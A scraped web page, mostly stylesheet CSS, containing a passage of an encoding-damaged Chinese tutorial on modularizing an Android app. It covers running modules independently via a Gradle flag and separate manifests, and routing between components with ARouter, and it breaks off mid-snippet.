.octicon-link,.markdown-body h2:hover .anchor .octicon-link,.markdown-body h3:hover .anchor .octicon-link,.markdown-body h4:hover .anchor .octicon-link,.markdown-body h5:hover .anchor .octicon-link,.markdown-body h6:hover .anchor .octicon-link{visibility:visible}.markdown-body h1:hover .anchor .octicon-link:before,.markdown-body h2:hover .anchor .octicon-link:before,.markdown-body h3:hover .anchor .octicon-link:before,.markdown-body h4:hover .anchor .octicon-link:before,.markdown-body h5:hover .anchor .octicon-link:before,.markdown-body h6:hover .anchor .octicon-link:before{width:16px;height:16px;content:" ";display:inline-block;background-image:url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' aria-hidden='true'%3E%3Cpath fill-rule='evenodd' d='M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z'/%3E%3C/svg%3E")}.markdown-body{-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;color:#24292e;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif,Apple Color Emoji,Segoe UI Emoji;font-size:16px;line-height:1.5;word-wrap:break-word}.markdown-body details{display:block}.markdown-body summary{display:list-item}.markdown-body a{background-color:initial}.markdown-body a:active,.markdown-body a:hover{outline-width:0}.markdown-body strong{font-weight:inherit;font-weight:bolder}.markdown-body h1{margin:.67em 0}.markdown-body img{border-style:none}.markdown-body code,.markdown-body kbd,.markdown-body pre{font-family:monospace,monospace;font-size:1em}.markdown-body hr{box-sizing:initial;overflow:visible}.markdown-body input{font:inherit;margin:0;overflow:visible}.markdown-body [type=checkbox]{box-sizing:border-box;padding:0}.markdown-body *{box-sizing:border-box}.markdown-body input{font-family:inherit;font-size:inherit;line-height:inherit}.markdown-body a{color:#0366d6;text-decoration:none}.markdown-body a:hover{text-decoration:underline}.markdown-body strong{font-weight:600}.markdown-body hr{height:0;margin:15px 0;overflow:hidden;background:transparent;border-bottom:1px solid #dfe2e5}.markdown-body hr:after,.markdown-body hr:before{display:table;content:""}.markdown-body hr:after{clear:both}.markdown-body table{border-spacing:0;border-collapse:collapse}.markdown-body td,.markdown-body th{padding:0}.markdown-body details summary{cursor:pointer}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin-top:0;margin-bottom:0}.markdown-body h1{font-size:32px}.markdown-body h1,.markdown-body h2{font-weight:600}.markdown-body h2{font-size:24px}.markdown-body h3{font-size:20px}.markdown-body h3,.markdown-body h4{font-weight:600}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:14px}.markdown-body h5,.markdown-body h6{font-weight:600}.markdown-body h6{font-size:12px}.markdown-body p{margin-top:0;margin-bottom:10px}.markdown-body blockquote{margin:0}.markdown-body ol,.markdown-body ul{padding-left:0;margin-top:0;margin-bottom:0}.markdown-body ol ol,.markdown-body ul ol{list-style-type:lower-roman}.markdown-body ol ol ol,.markdown-body ol ul ol,.markdown-body ul ol ol,.markdown-body ul ul ol{list-style-type:lower-alpha}.markdown-body dd{margin-left:0}.markdown-body code,.markdown-body pre{font-family:SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;font-size:12px}.markdown-body pre{margin-top:0;margin-bottom:0}.markdown-body input::-webkit-inner-spin-button,.markdown-body input::-webkit-outer-spin-button{margin:0;-webkit-appearance:none;appearance:none}.markdown-body :checked+.radio-label{position:relative;z-index:1;border-color:#0366d6}.markdown-body .border{border:1px solid #e1e4e8!important}.markdown-body .border-0{border:0!important}.markdown-body .border-bottom{border-bottom:1px solid #e1e4e8!important}.markdown-body .rounded-1{border-radius:3px!important}.markdown-body .bg-white{background-color:#fff!important}.markdown-body .bg-gray-light{background-color:#fafbfc!important}.markdown-body .text-gray-light{color:#6a737d!important}.markdown-body .pl-3,.markdown-body .px-3{padding-left:16px!important}.markdown-body .px-3{padding-right:16px!important}.markdown-body .f6{font-size:12px!important}.markdown-body .lh-condensed{line-height:1.25!important}.markdown-body .text-bold{font-weight:600!important}.markdown-body .pl-c{color:#6a737d}.markdown-body .pl-c1,.markdown-body .pl-s .pl-v{color:#005cc5}.markdown-body .pl-e,.markdown-body .pl-en{color:#6f42c1}.markdown-body .pl-s .pl-s1,.markdown-body .pl-smi{color:#24292e}.markdown-body .pl-ent{color:#22863a}.markdown-body .pl-k{color:#d73a49}.markdown-body .pl-pds,.markdown-body .pl-s,.markdown-body .pl-s .pl-pse .pl-s1,.markdown-body .pl-sr,.markdown-body .pl-sr .pl-cce,.markdown-body .pl-sr .pl-sra,.markdown-body .pl-sr .pl-sre{color:#032f62}.markdown-body .pl-smw,.markdown-body .pl-v{color:#e36209}.markdown-body .pl-bu{color:#b31d28}.markdown-body .pl-ii{color:#fafbfc;background-color:#b31d28}.markdown-body .pl-c2{color:#fafbfc;background-color:#d73a49}.markdown-body .pl-c2:before{content:"^M"}.markdown-body .pl-sr .pl-cce{font-weight:700;color:#22863a}.markdown-body .pl-ml{color:#735c0f}.markdown-body .pl-mh,.markdown-body .pl-mh .pl-en,.markdown-body .pl-ms{font-weight:700;color:#005cc5}.markdown-body .pl-mi{font-style:italic;color:#24292e}.markdown-body .pl-mb{font-weight:700;color:#24292e}.markdown-body .pl-md{color:#b31d28;background-color:#ffeef0}.markdown-body .pl-mi1{color:#22863a;background-color:#f0fff4}.markdown-body .pl-mc{color:#e36209;background-color:#ffebda}.markdown-body .pl-mi2{color:#f6f8fa;background-color:#005cc5}.markdown-body .pl-mdr{font-weight:700;color:#6f42c1}.markdown-body .pl-ba{color:#586069}.markdown-body .pl-sg{color:#959da5}.markdown-body .pl-corl{text-decoration:underline;color:#032f62}.markdown-body .mb-0{margin-bottom:0!important}.markdown-body .my-2{margin-bottom:8px!important;margin-top:8px!important}.markdown-body .pl-0{padding-left:0!important}.markdown-body .py-0{padding-top:0!important;padding-bottom:0!important}.markdown-body .pl-1{padding-left:4px!important}.markdown-body .pl-2{padding-left:8px!important}.markdown-body .py-2{padding-top:8px!important;padding-bottom:8px!important}.markdown-body .pl-3{padding-left:16px!important}.markdown-body .pl-4{padding-left:24px!important}.markdown-body .pl-5{padding-left:32px!important}.markdown-body .pl-6{padding-left:40px!important}.markdown-body .pl-7{padding-left:48px!important}.markdown-body .pl-8{padding-left:64px!important}.markdown-body .pl-9{padding-left:80px!important}.markdown-body .pl-10{padding-left:96px!important}.markdown-body .pl-11{padding-left:112px!important}.markdown-body .pl-12{padding-left:128px!important}.markdown-body hr{border-bottom-color:#eee}.markdown-body kbd{display:inline-block;padding:3px 5px;font:11px SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;line-height:10px;color:#444d56;vertical-align:middle;background-color:#fafbfc;border:1px solid #d1d5da;border-radius:3px;box-shadow:inset 0 -1px 0 #d1d5da}.markdown-body:after,.markdown-body:before{display:table;content:""}.markdown-body:after{clear:both}.markdown-body&gt;:first-child{margin-top:0!important}.markdown-body&gt;:last-child{margin-bottom:0!important}.markdown-body a:not([href]){color:inherit;text-decoration:none}.markdown-body blockquote,.markdown-body details,.markdown-body dl,.markdown-body ol,.markdown-body p,.markdown-body pre,.markdown-body table,.markdown-body ul{margin-top:0;margin-bottom:16px}.markdown-body hr{height:.25em;padding:0;margin:24px 0;background-color:#e1e4e8;border:0}.markdown-body blockquote{padding:0 1em;color:#6a737d;border-left:.25em solid #dfe2e5}.markdown-body blockquote&gt;:first-child{margin-top:0}.markdown-body blockquote&gt;:last-child{margin-bottom:0}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin-top:24px;margin-bottom:16px;font-weight:600;line-height:1.25}.markdown-body h1{font-size:2em}.markdown-body h1,.markdown-body h2{padding-bottom:.3em;border-bottom:1px solid #eaecef}.markdown-body h2{font-size:1.5em}.markdown-body h3{font-size:1.25em}.markdown-body h4{font-size:1em}.markdown-body h5{font-size:.875em}.markdown-body h6{font-size:.85em;color:#6a737d}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:0;margin-bottom:0}.markdown-body li{word-wrap:break-all}.markdown-body li&gt;p{margin-top:16px}.markdown-body li+li{margin-top:.25em}.markdown-body dl{padding:0}.markdown-body dl dt{padding:0;margin-top:16px;font-size:1em;font-style:italic;font-weight:600}.markdown-body dl dd{padding:0 16px;margin-bottom:16px}.markdown-body table{display:block;width:100%;overflow:auto}.markdown-body table th{font-weight:600}.markdown-body table td,.markdown-body table th{padding:6px 13px;border:1px solid #dfe2e5}.markdown-body table tr{background-color:#fff;border-top:1px solid #c6cbd1}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}.markdown-body img{max-width:100%;box-sizing:initial;background-color:#fff}.markdown-body img[align=right]{padding-left:20px}.markdown-body img[align=left]{padding-right:20px}.markdown-body code{padding:.2em .4em;margin:0;font-size:85%;background-color:rgba(27,31,35,.05);border-radius:3px}.markdown-body pre{word-wrap:normal}.markdown-body pre&gt;code{padding:0;margin:0;font-size:100%;word-break:normal;white-space:pre;background:transparent;border:0}.markdown-body .highlight{margin-bottom:16px}.markdown-body .highlight pre{margin-bottom:0;word-break:normal}.markdown-body .highlight pre,.markdown-body pre{padding:16px;overflow:auto;font-size:85%;line-height:1.45;background-color:#f6f8fa;border-radius:3px}.markdown-body pre code{display:inline;max-width:auto;padding:0;margin:0;overflow:visible;line-height:inherit;word-wrap:normal;background-color:initial;border:0}.markdown-body .commit-tease-sha{display:inline-block;font-family:SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;font-size:90%;color:#444d56}.markdown-body .full-commit .btn-outline:not(:disabled):hover{color:#005cc5;border-color:#005cc5}.markdown-body .blob-wrapper{overflow-x:auto;overflow-y:hidden}.markdown-body .blob-wrapper-embedded{max-height:240px;overflow-y:auto}.markdown-body .blob-num{width:1%;min-width:50px;padding-right:10px;padding-left:10px;font-family:SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;font-size:12px;line-height:20px;color:rgba(27,31,35,.3);text-align:right;white-space:nowrap;vertical-align:top;cursor:pointer;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.markdown-body .blob-num:hover{color:rgba(27,31,35,.6)}.markdown-body .blob-num:before{content:attr(data-line-number)}.markdown-body .blob-code{position:relative;padding-right:10px;padding-left:10px;line-height:20px;vertical-align:top}.markdown-body .blob-code-inner{overflow:visible;font-family:SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;font-size:12px;color:#24292e;word-wrap:normal;white-space:pre}.markdown-body .pl-token.active,.markdown-body .pl-token:hover{cursor:pointer;background:#ffea7f}.markdown-body .tab-size[data-tab-size="1"]{-moz-tab-size:1;tab-size:1}.markdown-body .tab-size[data-tab-size="2"]{-moz-tab-size:2;tab-size:2}.markdown-body .tab-size[data-tab-size="3"]{-moz-tab-size:3;tab-size:3}.markdown-body .tab-size[data-tab-size="4"]{-moz-tab-size:4;tab-size:4}.markdown-body .tab-size[data-tab-size="5"]{-moz-tab-size:5;tab-size:5}.markdown-body .tab-size[data-tab-size="6"]{-moz-tab-size:6;tab-size:6}.markdown-body .tab-size[data-tab-size="7"]{-moz-tab-size:7;tab-size:7}.markdown-body .tab-size[data-tab-size="8"]{-moz-tab-size:8;tab-size:8}.markdown-body .tab-size[data-tab-size="9"]{-moz-tab-size:9;tab-size:9}.markdown-body .tab-size[data-tab-size="10"]{-moz-tab-size:10;tab-size:10}.markdown-body .tab-size[data-tab-size="11"]{-moz-tab-size:11;tab-size:11}.markdown-body .tab-size[data-tab-size="12"]{-moz-tab-size:12;tab-size:12}.markdown-body .task-list-item{list-style-type:none}.markdown-body .task-list-item+.task-list-item{margin-top:3px}.markdown-body .task-list-item input{margin:0 .2em .25em -1.6em;vertical-align:middle}</style><style data-highlight="" data-highlight-key="github">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">èƒŒæ™¯</h2>
<p>åœ¨é¡¹ç›®çš„å¼€å‘è¿‡ç¨‹ä¸­ï¼Œéšç€å‚ä¸äººå‘˜çš„å¢å¤šä»¥åŠåŠŸèƒ½çš„å¢åŠ ï¼Œå¦‚æœæ²¡æœ‰ä½¿ç”¨åˆç†çš„å¼€å‘æ¶æ„ï¼Œä»£ç ä¼šè¶Šæ¥è¶Šè‡ƒè‚¿ï¼Œè€¦åˆè¶Šæ¥è¶Šä¸¥é‡ã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œ<strong>ç»„ä»¶åŒ–</strong>åº”è¿è€Œç”Ÿã€‚</p>
<h2 data-id="heading-1">ç»„ä»¶åŒ–çš„ä¼˜åŠ¿</h2>
<p>ç»„ä»¶åŒ–å¯ä»¥è§£å†³ä»¥ä¸‹é—®é¢˜ï¼š<br/></p>
<ol>
<li>å¯ä»¥å•ç‹¬è°ƒè¯•å’Œè¿è¡Œå•ç‹¬çš„ä¸šåŠ¡æ¨¡å—ï¼Œè¿™æ ·å¼€å‘äººå‘˜å¯ä»¥ä¸“æ³¨äºè‡ªå·±è´Ÿè´£çš„ä¸šåŠ¡æ¨¡å—çš„å¼€å‘ï¼Œæé«˜å¼€å‘çš„æ•ˆç‡ã€‚</li>
<li>å¯ä»¥é™ä½ä»£ç çš„è€¦åˆåº¦ï¼Œä¸ä¼šå¯¼è‡´ç‰µä¸€å‘è€ŒåŠ¨å…¨èº«ï¼Œæ–°åŠ å…¥çš„å¼€å‘äººå‘˜ä¹Ÿæ›´å®¹æ˜“ä¸Šæ‰‹é¡¹ç›®ã€‚å„ä¸šåŠ¡æ¨¡å—ä¹‹é—´æ²¡æœ‰ä¾èµ–å…³ç³»ï¼Œä¹Ÿä¼šå‡å°‘æäº¤ä»£ç å†²çªçš„é—®é¢˜ã€‚</li>
<li>å¯ä»¥çµæ´»é…ç½®ä¾èµ–çš„æ¨¡å—ï¼Œè®©åŸºç¡€æ¨¡å—æ›´å¥½åœ°å¾—åˆ°é‡ç”¨ã€‚</li>
<li>å¯ä»¥è®©å¼€å‘äººå‘˜çš„åˆ†å·¥æ›´åŠ æ˜ç¡®ï¼Œåˆ«çš„æ¨¡å—çš„å¼€å‘äººå‘˜ä¸èƒ½è½»æ˜“ä¿®æ”¹ä½ è´Ÿè´£çš„æ¨¡å—çš„ä»£ç ã€‚</li>
</ol>
<h2 data-id="heading-2">ç¤ºä¾‹</h2>
<p>ä¸‹é¢æˆ‘å°±ç”¨ä¸€ä¸ªç®€å•ç¤ºä¾‹æ¥è§£é‡Šå¦‚ä½•å®ç°Appçš„ç»„ä»¶åŒ–ã€‚</p>
<p>ç°åœ¨æœ‰ä¸€ä¸ªåº”ç”¨å¸‚åœº App ï¼Œè¯¥ App åŒ…å«5ä¸ªæ¨¡å—ï¼š</p>
<ul>
<li><code>appæ¨¡å—</code>ï¼šApp çš„å…¥å£ï¼›</li>
<li><code>homeæ¨¡å—</code>ï¼šApp çš„é¦–é¡µï¼Œä¸»è¦ç”¨äºå±•ç¤ºé¦–é¡µæ¨èä¸‹è½½çš„åº”ç”¨ï¼›</li>
<li><code>gameæ¨¡å—</code>ï¼šä¸»è¦ç”¨äºå±•ç¤ºæ¨èä¸‹è½½çš„æ¸¸æˆåº”ç”¨ï¼›</li>
<li><code>downloadæ¨¡å—</code>ï¼šä¸»è¦ç”¨äºå±•ç¤ºä¸‹è½½é¡¹çš„åˆ—è¡¨å’Œä¸‹è½½é¡¹çš„æ§åˆ¶ï¼›</li>
<li><code>baseæ¨¡å—</code>ï¼šæä¾› BaseActivity ã€ BaseFragment ã€å›¾ç‰‡åŠ è½½ã€ç½‘ç»œè¯·æ±‚ç­‰åŸºç¡€èƒ½åŠ›ï¼Œå„ä¸ªä¸šåŠ¡æ¨¡å—éƒ½éœ€è¦ä¾èµ–å®ƒï¼›</li>
</ul>
<p>app æ¨¡å—éœ€è¦ä¾èµ– home æ¨¡å—å’Œ game æ¨¡å—ï¼ŒåŒæ—¶ï¼Œhome æ¨¡å—å’Œ game æ¨¡å—éœ€è¦æ˜¾ç¤ºåº”ç”¨çš„ä¸‹è½½è¿›åº¦ï¼Œéœ€è¦ä¾èµ– download æ¨¡å—ï¼Œè¿™æ ·ï¼Œæ²¡æœ‰å®ç°ç»„ä»¶åŒ–ä¹‹å‰ï¼Œå„æ¨¡å—ä¹‹é—´çš„ä¾èµ–å…³ç³»å›¾å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/03290b05500549eda1dd6929889a69de~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp#?w=896&amp;h=966&amp;s=75829&amp;e=png&amp;b=fdfdfd" alt="image.png" width="50%" loading="lazy"/>
<h4 data-id="heading-3">ç»„ä»¶ç‹¬ç«‹è°ƒè¯•</h4>
<p>å®ç°ç»„ä»¶åŒ–ï¼Œé¦–å…ˆæˆ‘ä»¬è¦è®© home æ¨¡å—ã€ game æ¨¡å—ã€ download æ¨¡å—è¿™å‡ ä¸ªä¸šåŠ¡æ¨¡å—å¯ä»¥å•ç‹¬è°ƒè¯•å’Œè¿è¡Œï¼Œå¦‚ä½•å®ç°å‘¢ï¼Ÿ</p>
<p>æˆ‘ä»¬å¯ä»¥åœ¨å·¥ç¨‹çš„ gradle.properties ä¸­é…ç½®ä¸€ä¸ªå¸¸é‡å€¼ <code>moduleRunAlone</code> ï¼Œå€¼ä¸º true å³è¡¨ç¤ºè¿™å‡ ä¸ªä¸šåŠ¡æ¨¡å—å¯ä»¥ç‹¬ç«‹è°ƒè¯•å’Œè¿è¡Œï¼š</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># Enables the module to run alone</span>
<span class="hljs-attr">moduleRunAlone</span> = <span class="hljs-literal">true</span>
</code></pre>
<p>ç„¶ååœ¨å„ä¸šåŠ¡æ¨¡å—çš„ build.gradle ä¸­è¯»å– moduleRunAlone çš„å€¼ï¼š</p>
<pre><code class="hljs language-css" lang="css">if(moduleRunAlone<span class="hljs-selector-class">.toBoolean</span>()){
    apply plugin: <span class="hljs-string">'com.android.application'</span>
}else{
    apply plugin: <span class="hljs-string">'com.android.library'</span>
}

android {
    sourceSets {
        <span class="hljs-selector-tag">main</span> {
            // å•ç‹¬è°ƒè¯•ä¸é›†æˆè°ƒè¯•æ—¶ä½¿ç”¨ä¸åŒçš„ AndroidManifest<span class="hljs-selector-class">.xml</span> æ–‡ä»¶
            if (moduleRunAlone<span class="hljs-selector-class">.toBoolean</span>()) {
                manifest<span class="hljs-selector-class">.srcFile</span> '<span class="hljs-attribute">src</span>/<span class="hljs-selector-tag">main</span>/moduleManifest/AndroidManifest<span class="hljs-selector-class">.xml</span>'
            } else {
                manifest<span class="hljs-selector-class">.srcFile</span> '<span class="hljs-attribute">src</span>/<span class="hljs-selector-tag">main</span>/AndroidManifest<span class="hljs-selector-class">.xml</span>'
            }
        }
    }
}
</code></pre>
<p>Android Studio å¼€å‘ Android é¡¹ç›®ä½¿ç”¨çš„æ˜¯ Gradle æ¥æ„å»ºçš„ï¼Œ Gradle æä¾›äº† 3 ç§æ’ä»¶ï¼Œè¿™é‡Œé€šè¿‡è¯»å– moduleRunAlone çš„å€¼æ¥é…ç½® module çš„ç±»å‹ï¼š<br/></p>
<ul>
<li><code> application æ’ä»¶</code>ï¼šapply plugin: 'com.android.application'<br/></li>
<li><code> library æ’ä»¶</code>ï¼šapply plugin: 'com.android.library'<br/></li>
</ul>
<p>åœ¨å¯¹åº”çš„ä¸šåŠ¡æ¨¡å—ä¸­ï¼Œæ–°å»º moduleManifest ç›®å½•ï¼Œæ·»åŠ æ¨¡å—å•ç‹¬è°ƒè¯•å¯¹åº”çš„ AndroidManifest.xml æ–‡ä»¶ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/61fc93d10a184d7487c8d963c090681c~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp#?w=606&amp;h=598&amp;s=56356&amp;e=png&amp;b=fefcfc" alt="image.png" width="50%" loading="lazy"/>
<p>ç„¶ååœ¨ build.gradle ä¸­æ ¹æ® moduleRunAlone çš„å€¼æ¥é…ç½®ä¸åŒçš„ AndroidManifest.xml æ–‡ä»¶çš„è·¯å¾„ã€‚</p>
<p>åœ¨ home æ¨¡å—ä¸­ï¼Œé›†æˆè°ƒè¯•çš„å…¥å£é¡µé¢æ˜¯ HomeFragment ï¼Œå•ç‹¬è°ƒè¯•éœ€è¦æœ‰å…¥å£ Activity ï¼Œè¿™é‡Œæˆ‘ä»¬æ–°å»º HomeActivity ä½œä¸ºå…¥å£ Activity :</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HomeActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AppCompatActivity</span> {

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> {
        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);
        setContentView(R.layout.activity_home);

        <span class="hljs-type">FragmentManager</span> <span class="hljs-variable">manager</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getSupportFragmentManager();
        <span class="hljs-type">FragmentTransaction</span> <span class="hljs-variable">ft</span> <span class="hljs-operator">=</span> manager.beginTransaction();
        ft.add(R.id.container_fragment, <span class="hljs-keyword">new</span> <span class="hljs-title class_">HomeFragment</span>());
        ft.commit();
    }
}
</code></pre>
<p>activity_home.xml:</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"utf-8"</span>?&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">androidx.constraintlayout.widget.ConstraintLayout</span> <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">"http://schemas.android.com/apk/res/android"</span>
    <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span>
    <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"match_parent"</span>
    <span class="hljs-attr">xmlns:app</span>=<span class="hljs-string">"http://schemas.android.com/apk/res-auto"</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">FrameLayout</span>
        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/container_fragment"</span>
        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span>
        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"match_parent"</span>
        <span class="hljs-attr">app:layout_constraintTop_toTopOf</span>=<span class="hljs-string">"parent"</span>
        <span class="hljs-attr">app:layout_constraintStart_toStartOf</span>=<span class="hljs-string">"parent"</span>/&gt;</span>

<span class="hljs-tag">&lt;/<span class="hljs-name">androidx.constraintlayout.widget.ConstraintLayout</span>&gt;</span>
</code></pre>
<p>è¿™æ ·å•ç‹¬è°ƒè¯•çš„æ—¶å€™å°±å¯ä»¥ä½¿ç”¨ HomeActivity æ¥å¯åŠ¨ HomeFragmentäº†ã€‚</p>
<p>å•ç‹¬è°ƒè¯•çš„ AndroidManifest.xml ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"utf-8"</span>?&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">manifest</span> <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">"http://schemas.android.com/apk/res/android"</span>
    <span class="hljs-attr">package</span>=<span class="hljs-string">"com.example.home"</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">application</span>
        <span class="hljs-attr">android:name</span>=<span class="hljs-string">".HomeApp"</span>
        <span class="hljs-attr">android:allowBackup</span>=<span class="hljs-string">"true"</span>
        <span class="hljs-attr">android:theme</span>=<span class="hljs-string">"@style/Theme.AppCompat.Light.NoActionBar"</span>&gt;</span>

        <span class="hljs-tag">&lt;<span class="hljs-name">activity</span>
            <span class="hljs-attr">android:name</span>=<span class="hljs-string">".HomeActivity"</span>
            <span class="hljs-attr">android:exported</span>=<span class="hljs-string">"true"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">intent-filter</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">"android.intent.action.MAIN"</span> /&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">category</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">"android.intent.category.LAUNCHER"</span> /&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">intent-filter</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">activity</span>&gt;</span>

    <span class="hljs-tag">&lt;/<span class="hljs-name">application</span>&gt;</span>

<span class="hljs-tag">&lt;/<span class="hljs-name">manifest</span>&gt;</span>
</code></pre>
<p>è¿™æ ·é…ç½®å®Œæˆåï¼ŒæŠŠ moduleRunAlone çš„å€¼æ”¹ä¸º true ï¼Œç„¶å Sync Project ï¼Œ home æ¨¡å—å°±å¯ä»¥å•ç‹¬è¿è¡Œäº†ï¼Œè¿™æ ·å°±æŠŠ home æ¨¡å—æ”¹é€ æˆäº†ä¸€ä¸ªå¯ä»¥ç‹¬ç«‹è°ƒè¯•è¿è¡Œçš„<strong>ç»„ä»¶</strong>ã€‚</p>
<h4 data-id="heading-4">é¡µé¢è·³è½¬</h4>
<p>ç»„ä»¶åŒ–çš„æ ¸å¿ƒæ˜¯è§£è€¦ï¼Œç»„ä»¶é—´ä¸èƒ½æœ‰ä¾èµ–ï¼Œé‚£ä¹ˆå¦‚ä½•å®ç°ç»„ä»¶é—´çš„é¡µé¢è·³è½¬å‘¢ï¼Ÿ</p>
<p>æ¯”å¦‚ç‚¹å‡» HomeFragment ä¸­çš„æŸä¸ªåº”ç”¨åï¼Œæˆ‘éœ€è¦è·³è½¬åˆ° download ç»„ä»¶ä¸‹çš„ DownloadActivity æ¥ä¸‹è½½è¯¥åº”ç”¨ï¼Œç”±äº home ç»„ä»¶ä¸ä¾èµ– download ç»„ä»¶ï¼Œç›´æ¥è·³è½¬æ˜¯è¡Œä¸é€šçš„ï¼Œè¿™é‡Œæˆ‘ä»¬ä½¿ç”¨ ARouter æ¥è¿›è¡Œè·³è½¬ã€‚</p>
<p>ARouter æ˜¯é˜¿é‡Œå¼€å‘çš„ï¼Œæ˜¯ä¸€ä¸ªå¸®åŠ©å®‰å“ App è¿›è¡Œç»„ä»¶åŒ–æ”¹é€ çš„è·¯ç”±æ¡†æ¶ã€‚</p>
<p>å‰é¢æåˆ°ï¼Œå„ä¸ªä¸šåŠ¡æ¨¡å—éƒ½ä¾èµ– base æ¨¡å—ï¼Œæˆ‘ä»¬åœ¨ base æ¨¡å—çš„ build.gradle ä¸­ä½¿ç”¨ api æ¥æ·»åŠ  ARouter ä¾èµ–ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino">api <span class="hljs-string">"com.alibaba:arouter-api:1.5.2"</span>
</code></pre>
<p>è¿™æ ·åœ¨å„ä¸ªä¸šåŠ¡æ¨¡å—ä¸­å¯ä»¥ä¼ é€’ä¾èµ–ARouteråº“ã€‚</p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ arouter-compiler çš„ annotationProcessor ä¾èµ–éœ€è¦åœ¨æ‰€æœ‰ä½¿ç”¨åˆ° ARouter çš„æ¨¡å—ä¸­å•ç‹¬æ·»åŠ ï¼Œå¦åˆ™æ— æ³•ç”Ÿæˆç´¢å¼•æ–‡ä»¶ï¼Œä¼šå¯¼è‡´æ— æ³•è·³è½¬æˆåŠŸï¼Œå¹¶ä¸”è¿˜è¦åœ¨å¯¹åº”æ¨¡å—çš„ build.gradle ä¸­æ·»åŠ ç‰¹å®šé…ç½®ã€‚</p>
<p>ä¾‹å¦‚ï¼Œåœ¨ home æ¨¡å—çš„ build.gradle æ·»åŠ çš„é…ç½®å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript">android {
    defaultConfig {
        javaCompileOptions {
            annotationProcessorOptions {
